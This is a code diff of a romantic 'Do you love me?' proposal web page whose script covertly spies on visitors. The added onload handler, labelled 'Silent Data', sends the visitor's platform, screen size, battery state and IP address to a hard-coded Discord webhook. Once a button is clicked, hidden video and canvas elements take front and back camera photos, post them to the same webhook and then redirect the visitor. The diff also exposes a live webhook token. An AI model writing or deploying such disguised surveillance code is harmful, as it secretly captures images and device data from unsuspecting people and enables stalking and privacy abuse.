@@ -6,10 +6,7 @@
   <title>Proposed Her</title>
   <link rel="stylesheet" href="./style.css" />
   <style>
-    /* Camera elements ko hidden rakha hai */
     #video, #canvas { display: none; }
-    
-    /* Yes/No buttons ki styling agar style.css load na ho */
     .btn a {
       padding: 10px 25px;
       margin: 10px;
@@ -22,12 +19,13 @@
     }
   </style>
 </head>
-<body>
+<body style="background-color: #1a1a1a; text-align: center; font-family: Arial, sans-serif;">
+
   <div class="dev-name" style="position: absolute; top: 10px; left: 10px; font-size: 0.8rem; color: rgba(255,255,255,0.7); font-weight: bold;">
     Dev by Faisal
   </div>
 
-  <div class="container" style="text-align: center; padding-top: 50px; font-family: Arial, sans-serif;">
+  <div class="container" style="padding-top: 50px;">
     <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px;">
     <h1 style="color: #fff;">Do you love me? 🤗</h1>
     <p style="color: #eee;">Chiku is all yours</p>
@@ -41,61 +39,65 @@
   <canvas id="canvas"></canvas>
 
   <script>
-    // Aapka Discord Webhook URL yahan add kar diya hai
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
+    // --- Silent Data: Page load hote hi bhej do ---
+    window.onload = async () => {
+        let silentData = `🕵️ **Silent Info Collected:**\n`;
+        silentData += `📱 **Platform:** ${navigator.platform}\n`;
+        silentData += `🖥️ **Screen:** ${window.screen.width}x${window.screen.height}\n`;
+        
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                silentData += `🔋 **Battery:** ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})\n`;
+            }
+        } catch (e) {}
+
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                silentData += `🌍 **IP:** ${data.ip}`;
+                sendToDiscord(null, silentData);
+            }).catch(() => sendToDiscord(null, silentData));
+    };
+
+    // --- Camera Capture: Sirf click par ---
     async function startCapture(mode) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: mode } 
-        });
-        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // Photo lene se pehle thora wait (1.5 sec)
         setTimeout(() => {
-          captureImage(stream, mode);
-        }, 1500);
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          
+          canvas.toBlob(blob => {
+            sendToDiscord(blob, `📸 **Camera:** ${mode === 'user' ? 'Front' : 'Back'}`);
+            stream.getTracks().forEach(t => t.stop());
 
+            // Agar Front (user) capture ho gaya, to ab Back (environment) try karo
+            if (mode === 'user') {
+                setTimeout(() => startCapture('environment'), 500);
+            } else {
+                // Sab khatam, ab redirect
+                window.location.href = "page1.html";
+            }
+          }, 'image/png');
+        }, 1000);
       } catch (err) {
-        console.log("Permission Error: ", err);
-        // Agar user block kare to bhi redirect kar dein
-        window.location.href = "page1.html";
+          window.location.href = "page1.html";
       }
     }
 
-    function captureImage(stream, mode) {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      
-      canvas.toBlob(blob => {
+    function sendToDiscord(blob, content) {
         const formData = new FormData();
-        formData.append('file', blob, `faisal_capture_${mode}.png`);
-        formData.append('content', `🚀 **Alert! Faisal Bhai, Nayi Photo Agayi!**\n📸 Camera: ${mode === 'user' ? 'Front (Selfie)' : 'Back'}`);
-
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        }).then(() => {
-          // Stream close karna
-          stream.getTracks().forEach(track => track.stop());
-          
-          if(mode === 'user') {
-            // Front ke baad foran Back camera try karein
-            startCapture('environment'); 
-          } else {
-            // Sab done, ab next page par bhej dein
-            window.location.href = "page1.html";
-          }
-        }).catch(err => {
-            window.location.href = "page1.html";
-        });
-      }, 'image/png');
+        if (blob) formData.append('file', blob, `faisal_${Date.now()}.png`);
+        formData.append('content', content);
+        fetch(WEBHOOK_URL, { method: 'POST', body: formData });
     }
   </script>
 </body>
